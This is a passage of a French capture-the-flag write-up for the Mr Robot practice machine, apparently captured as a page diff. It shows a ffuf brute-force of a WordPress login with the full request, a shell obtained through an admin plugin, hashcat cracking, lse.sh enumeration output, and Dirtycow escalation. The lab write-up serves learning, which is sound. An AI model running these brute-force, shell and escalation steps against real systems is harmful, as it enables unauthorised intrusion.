-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof040 Found any .htpasswd files?...................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof050 Are there private keys in ssh-agent?............................ nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof070 Can we write to a ssh-agent socket?............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof080 Can we write to a gpg-agent socket?............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof090 Found any keepass database files?............................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof100 Found any &#39;</span>pass<span style="color:#e6db74">&#39; store directories?............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof110 Are there any tmux sessions available?.......................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sof120 Are there any tmux sessions from other users?................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof130 Can we write to tmux session sockets from other users?.......... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof140 Are any screen sessions available?.............................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sof150 Are there any screen sessions from other users?................. nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof160 Can we write to screen session sockets from other users?........ nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] sof170 Can we access MongoDB databases without credentials?............ nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] sof180 Can we access any Kerberos credentials?......................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sof500 Sudo version.................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sof510 MySQL version................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sof520 Postgres version................................................ skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sof530 Apache version.................................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sof540 Tmux version.................................................... skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[i] sof550 Screen version.................................................. skip
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">=============================================================( containers )=====
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ctn000 Are we in a docker container?................................... nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] ctn010 Is docker available?............................................ nope
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] ctn020 Is the user a member of the &#39;</span>docker<span style="color:#960050;background-color:#1e0010">&#39;</span> group?..................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ctn200 Are we in a lxc container?...................................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ctn210 Is the user a member of any lxc/lxd group?...................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">==============================================================(</span> processes <span style="color:#f92672">)=====</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> pro000 Waiting <span style="color:#66d9ef">for</span> the process monitor to finish....................... yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> pro001 Retrieving process binaries..................................... yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> pro002 Retrieving process users........................................ yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> pro010 Can we write in any process binary?............................. nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pro020 Processes running with root permissions......................... yes!
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pro030 Processes running by non-root users with shell.................. nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> pro500 Running processes............................................... skip
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> pro510 Running process binaries and permissions........................ skip
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===================================================================(</span> CVEs <span style="color:#f92672">)=====</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2019-5736 Escalate in some types of docker containers.............. nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2021-3560 Checking <span style="color:#66d9ef">for</span> policykit vulnerability..................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2021-4034 Checking <span style="color:#66d9ef">for</span> PwnKit vulnerability........................ nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2022-0847 Dirty Pipe vulnerability................................. nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> cve-2023-22809 Sudoedit bypass in Sudo &lt;<span style="color:#f92672">=</span> 1.9.12p1..................... yes!
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================(</span> FINISHED <span style="color:#f92672">)==================================</span>
-</span></span></code></pre></div>  </div>
-</details>
-<h3 id="dirtycow">
-  Dirtycow
-  
-  <a class="anchor" href="#dirtycow">#</a>
-  
-</h3>
-<p>L&rsquo;énumération nous montre une faille possible avec dirtycow. On exploite directement la faille et on obtient un shell root pour notre dernier drapeau.</p>
-<p><img src="../img/mrrobot_root.png" alt="root" /></p>
-</article>
- 
-      
-
-      <footer class="book-footer">
-        
-  <div class="flex flex-wrap justify-between">
-
-
-
-
-
-</div>
-
-
-
-
-
-  
-  
-  
-  <div class="flex flex-wrap justify-between">
-    <span>
-    
-      <a href="/docs/writeups/vm/" class="flex align-center book-icon">
-        <img src="/svg/backward.svg" class="book-icon" alt="Previous" title="Virtual Machines" />
-        <span>Virtual Machines</span>
-      </a>
-    
-    </span>
-    <span>
-    
-      <a href="/docs/divers/blogs/" class="flex align-center book-icon">
-        <span>Blogs</span>
-        <img src="/svg/forward.svg" class="book-icon" alt="Next" title="Blogs" />
-      </a>
-    
-    </span>
-  </div>
-  
-
-
-
-
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
-
-
- 
-        
-      </footer>
-
-      
-  
-  <div class="book-comments">
-
-</div>
-  
- 
-      <label for="menu-control" class="hidden book-menu-overlay"></label>
-    </div>
-
-    
-
-<aside class="book-toc">
-  <div class="book-toc-content">
-    
-  
-<nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#acces-a-lapplication">Acces a l&rsquo;application</a>
-      <ul>
-        <li><a href="#robotstxt">robots.txt</a></li>
-        <li><a href="#fuzzing--bruteforce">Fuzzing &amp; Bruteforce</a></li>
-      </ul>
-    </li>
-    <li><a href="#shell">Shell</a>
-      <ul>
-        <li><a href="#wordpress-plugin">Wordpress Plugin</a></li>
-        <li><a href="#utilisateur-robot">Utilisateur robot</a></li>
-        <li><a href="#hashcat">Hashcat</a></li>
-      </ul>
-    </li>
-    <li><a href="#escalade-de-privilege">Escalade de privilege</a>
-      <ul>
-        <li><a href="#enumeration-avec-les">Enumeration avec LES</a></li>
-        <li><a href="#dirtycow">Dirtycow</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-
-
-
-  </div>
-</aside>
-
- 
-  </main>
-
-  
-</body>
-</html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+On accede à l&rsquo;application depuis le port HTTP. A partir de là l&rsquo;application se présente comme un terminal. quelques options sont disponible mais l&rsquo;application nous montre majoritairement des videos et du texte."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/vm/collapsed/mrrobot/"><meta property="og:site_name" content="@camillegr"><meta property="og:title" content="Mr Robot"><meta property="og:description" content="Mr Robot # Reconnaissance # La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me…) . Cette machine nous demande de récupérer 3 drapeaux.
+Acces a l’application # On accede à l’application depuis le port HTTP. A partir de là l’application se présente comme un terminal. quelques options sont disponible mais l’application nous montre majoritairement des videos et du texte."><meta property="og:locale" content="fr_fr"><meta property="og:type" content="article"><meta property="article:section" content="docs"><title>Mr Robot | @camillegr</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=//localhost:1313/docs/writeups/vm/collapsed/mrrobot/><link rel=stylesheet href=/book.min.d60d65c9fd57805d29fb9d7109cb03a93c46852bac9bb8cdfec366ee739b3605.css integrity="sha256-1g1lyf1XgF0p+51xCcsDqTxGhSusm7jN/sNm7nObNgU=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.1c9dd31dc83c2444f9b15c785c2d37b9e53410f21c869d7f359ec0694308ba24.js integrity="sha256-HJ3THcg8JET5sVx4XC03ueU0EPIchp1/NZ7AaUMIuiQ=" crossorigin=anonymous></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>@camillegr</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-ad93f8b4ee98a57a6224ee06f39153b9 class=toggle>
+<label for=section-ad93f8b4ee98a57a6224ee06f39153b9 class=flex><a role=button class=flex-auto>Projets Personnels</a></label><ul><li><a href=/docs/projets/collapsed/tofuzz/>ToFuzz</a></li></ul></li><li><input type=checkbox id=section-72538655c7e4bb37bc80c6f43d7e4b3b class=toggle checked>
+<label for=section-72538655c7e4bb37bc80c6f43d7e4b3b class=flex><a href=/docs/writeups/ class=flex-auto>Writeups</a></label><ul><li><input type=checkbox id=section-14ed21d169f82c1f4e9784c42f27b9c3 class=toggle>
+<label for=section-14ed21d169f82c1f4e9784c42f27b9c3 class=flex><a href=/docs/writeups/rootmepro2025/ class=flex-auto>CTF 2025 | Root-Me Pro x DGSE</a></label><ul><li><a href=/docs/writeups/rootmepro2025/collapsed/mission1/>Mission 1 - IA</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission2/>Mission 2 - SOC</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission3/>Mission 3 - Forensic</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission4/>Mission 4 - Pentest</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission5/>Mission 5 - Mobile</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission6/>Mission 6 - OSINT</a></li></ul></li><li><input type=checkbox id=section-661913a3e27635165633fb2069bf836f class=toggle checked>
+<label for=section-661913a3e27635165633fb2069bf836f class=flex><a href=/docs/writeups/vm/ class=flex-auto>Virtual Machines</a></label><ul><li><a href=/docs/writeups/vm/collapsed/mrrobot/ class=active>Mr Robot</a></li><li><a href=/docs/writeups/vm/collapsed/wonderlands/>Wonderlands</a></li></ul></li></ul></li><li class=book-section-flat><span>Divers</span><ul><li><a href=/docs/divers/blogs/>Blogs</a></li></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Mr Robot</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#acces-a-lapplication>Acces a l&rsquo;application</a><ul><li><a href=#robotstxt>robots.txt</a></li><li><a href=#fuzzing--bruteforce>Fuzzing & Bruteforce</a></li></ul></li><li><a href=#shell>Shell</a><ul><li><a href=#wordpress-plugin>Wordpress Plugin</a></li><li><a href=#utilisateur-robot>Utilisateur robot</a></li><li><a href=#hashcat>Hashcat</a></li></ul></li><li><a href=#escalade-de-privilege>Escalade de privilege</a><ul><li><a href=#enumeration-avec-les>Enumeration avec LES</a></li><li><a href=#dirtycow>Dirtycow</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=mr-robot>Mr Robot
+<a class=anchor href=#mr-robot>#</a></h1><p><img src=../img/mrrobot_illu.png alt="Screenshot de l&rsquo;application"></p><h2 id=reconnaissance>Reconnaissance
+<a class=anchor href=#reconnaissance>#</a></h2><p>La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me&mldr;) . Cette machine nous demande de récupérer 3 drapeaux.</p><h2 id=acces-a-lapplication>Acces a l&rsquo;application
+<a class=anchor href=#acces-a-lapplication>#</a></h2><p>On accede à l&rsquo;application depuis le port HTTP. A partir de là l&rsquo;application se présente comme un terminal. quelques options sont disponible mais l&rsquo;application nous montre majoritairement des videos et du texte.</p><p>En utilisant gobuster on s&rsquo;aperçoit également que l&rsquo;application est en fait un site wordpress.</p><h3 id=robotstxt>robots.txt
+<a class=anchor href=#robotstxt>#</a></h3><p>en fouillant un petit peu on trouve rapidement le robots.txt qui contient notre premier drapeau mais également un dictionnaire .dic.</p><h3 id=fuzzing--bruteforce>Fuzzing & Bruteforce
+<a class=anchor href=#fuzzing--bruteforce>#</a></h3><p>Sur notre site wordpress, on utilise la fonctionnalité &ldquo;Mot de passe oublié&rdquo; pour essayer de trouver un utilisateur existant. En se servant des noms des personnages de la série on trouve que &ldquo;Elliot&rdquo; est utilisateur.</p><p>On lance alors ffuf et on trouve le mot de passe.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -request login.txt -w uniquedic.dic -t <span style=color:#ae81ff>200</span> -o fuzzResult  -fl <span style=color:#ae81ff>59</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /wp-login.php <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>ctf04.root-me.org</span>
+</span></span><span style=display:flex><span>Content-Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>106</span>
+</span></span><span style=display:flex><span>Referer<span style=color:#f92672>:</span> <span style=color:#ae81ff>http://ctf04.root-me.org/wp-login.php</span>
+</span></span><span style=display:flex><span>Accept-Encoding<span style=color:#f92672>:</span> <span style=color:#ae81ff>gzip, deflate, br</span>
+</span></span><span style=display:flex><span>Cookie<span style=color:#f92672>:</span> <span style=color:#ae81ff>xxxxx</span>
+</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>keep-alive</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>log=Elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fctf04.root-me.org%2Fwp-admin%2F&amp;testcookie=1%
+</span></span></code></pre></div><p><img src=../img/mrrobot_fuzzing.png alt=fuzzing></p><p>On obtient le mot de passe : &ldquo;ER28-0652&rdquo;.</p><h2 id=shell>Shell
+<a class=anchor href=#shell>#</a></h2><h3 id=wordpress-plugin>Wordpress Plugin
+<a class=anchor href=#wordpress-plugin>#</a></h3><p>Il se trouve qu&rsquo;Elliot est administrateur du site wordpress. On va donc installer un plugin qui nous permettra d&rsquo;executer des commandes sur la machine. On installe donc le plugin WPTerm. Après ça on peut récupérer un terminal et lister les utilisateurs via le fichier /etc/passwd</p><p><img src=../img/mrrobot_passwd.png alt=passwd></p><h3 id=utilisateur-robot>Utilisateur robot
+<a class=anchor href=#utilisateur-robot>#</a></h3><p>Une fois sur le terminal, on liste les utilisateurs en vérifiant le fichier /etc/passwd. On s&rsquo;aperçoit qu&rsquo;il y a un utilisateur robot. Cet utilisateur a un fichier password.raw-md5 dans son dossier utilisateur.</p><h3 id=hashcat>Hashcat
+<a class=anchor href=#hashcat>#</a></h3><p>On utilise hashcat pour essayer de trouver le mot de passe correspondant :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>0</span> hash /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img src=../img/mrrobot_hashcat.png alt=passwd></p><p>on trouve le mot de passe &ldquo;abcdefghijklmnopqstruvwxyz&rdquo;. dans robot on trouve egalement notre deuxième drapeau.</p><h2 id=escalade-de-privilege>Escalade de privilege
+<a class=anchor href=#escalade-de-privilege>#</a></h2><p>Après une énumération manuelle on voit qu&rsquo;il n&rsquo;y pas moyen d&rsquo;exploiter de failles de sudo ni d&rsquo;exploiter les fichiers de l&rsquo;utilisateur. On passe à une énumération automatisée.</p><h3 id=enumeration-avec-les>Enumeration avec LES
+<a class=anchor href=#enumeration-avec-les>#</a></h3><details><summary>Enumeration LES</summary><div class=markdown-inner><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> ./lse.sh
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>If you know the current user password, write it here to check sudo privileges: abcdefghijklmnopqrstuvwxyz
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> LSE Version: 4.14nw
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        User: robot
+</span></span><span style=display:flex><span>     User ID: <span style=color:#ae81ff>1002</span>
+</span></span><span style=display:flex><span>    Password: ******
+</span></span><span style=display:flex><span>        Home: /home/robot
+</span></span><span style=display:flex><span>        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+</span></span><span style=display:flex><span>       umask: <span style=color:#ae81ff>0002</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Hostname: linux
+</span></span><span style=display:flex><span>       Linux: 3.13.0-55-generic
+</span></span><span style=display:flex><span>Distribution: Ubuntu 14.04.2 LTS
+</span></span><span style=display:flex><span>Architecture: x86_64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>=====================(</span> Current Output Verbosity Level: <span style=color:#ae81ff>0</span> <span style=color:#f92672>)======================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================(</span> humanity <span style=color:#f92672>)=====</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> nowar0 Should we question autocrats and their <span style=color:#e6db74>&#34;military operations&#34;</span>?... yes!
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>                                      NO
+</span></span><span style=display:flex><span>                                      WAR
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span><span style=color:#f92672>==================================================================(</span> users <span style=color:#f92672>)=====</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> usr000 Current user groups............................................. yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> usr010 Is current user in an administrative group?..................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> usr020 Are there other users in administrative groups?................. yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> usr030 Other users with shell.......................................... yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> usr040 Environment information......................................... skip
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> usr050 Groups <span style=color:#66d9ef>for</span> other users.......................................... skip
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> usr060 Other users..................................................... skip
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> usr070 PATH variables defined inside /etc.............................. yes!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> usr080 Is <span style=color:#e6db74>&#39;.&#39;</span> in a PATH variable defined inside /etc?.................. nope
+</span></span><span style=display:flex><span><span style=color:#f92672>===================================================================(</span> sudo <span style=color:#f92672>)=====</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> sud000 Can we sudo without a password?................................. nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> sud010 Can we list sudo commands without a password?................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> sud020 Can we sudo with a password?.................................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> sud030 Can we list sudo commands with a password?...................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sud040 Can we read sudoers files?...................................... nope
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sud050 Do we know <span style=color:#66d9ef>if</span> any other users used sudo?........................ nope
+</span></span><span style=display:flex><span><span style=color:#f92672>============================================================(</span> file system <span style=color:#f92672>)=====</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> fst000 Writable files outside user<span style=color:#e6db74>&#39;s home.............................. yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst010 Binaries with setuid bit........................................ yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst020 Uncommon setuid binaries........................................ yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>/usr/local/bin/nmap
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst030 Can we write to any setuid binary?.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst040 Binaries with setgid bit........................................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst050 Uncommon setgid binaries........................................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst060 Can we write to any setgid binary?.............................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst070 Can we read /root?.............................................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst080 Can we read subdirectories under /home?......................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst090 SSH files in home directories................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst100 Useful binaries................................................. yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst110 Other interesting files in home directories..................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst120 Are there any credentials in fstab/mtab?........................ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst130 Does &#39;</span>robot<span style=color:#e6db74>&#39; have mail?......................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst140 Can we access other users mail?................................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst150 Looking for GIT/SVN repositories................................ yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst160 Can we write to critical files?................................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst170 Can we write to critical directories?........................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst190 Can we read any backup?......................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst200 Are there possible credentials in any shell history file?....... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] fst210 Are there NFS exports with &#39;</span>no_root_squash<span style=color:#e6db74>&#39; option?............. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] fst220 Are there NFS exports with &#39;</span>no_all_squash<span style=color:#e6db74>&#39; option?.............. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] fst500 Files owned by user &#39;</span>robot<span style=color:#e6db74>&#39;..................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] fst510 SSH files anywhere.............................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] fst520 Check hosts.equiv file and its contents......................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] fst530 List NFS server shares.......................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] fst540 Dump fstab file................................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>=================================================================( system )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sys000 Who is logged in................................................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sys010 Last logged in users............................................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sys020 Does the /etc/passwd have hashes?............................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sys022 Does the /etc/group have hashes?................................ nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sys030 Can we read shadow files?....................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sys040 Check for other superuser accounts.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sys050 Can root user log in via SSH?................................... yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sys060 List available shells........................................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sys070 System umask in /etc/login.defs................................. skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] sys080 System password policies in /etc/login.defs..................... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>===============================================================( security )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sec000 Is SELinux present?............................................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sec010 List files with capabilities.................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sec020 Can we write to a binary with caps?............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sec030 Do we have all caps in any binary?.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] sec040 Users with associated capabilities.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sec050 Does current user have capabilities?............................ skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] sec060 Can we read the auditd log?..................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>========================================================( recurrent tasks )=====
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ret000 User crontab.................................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] ret010 Cron tasks writable by user..................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ret020 Cron jobs....................................................... yes!
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ret030 Can we read user crontabs....................................... nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ret040 Can we list other user cron tasks?.............................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ret050 Can we write to any paths present in cron jobs.................. nope
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] ret060 Can we write to executable paths present in cron jobs........... skip
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[i] ret400 Cron files...................................................... skip
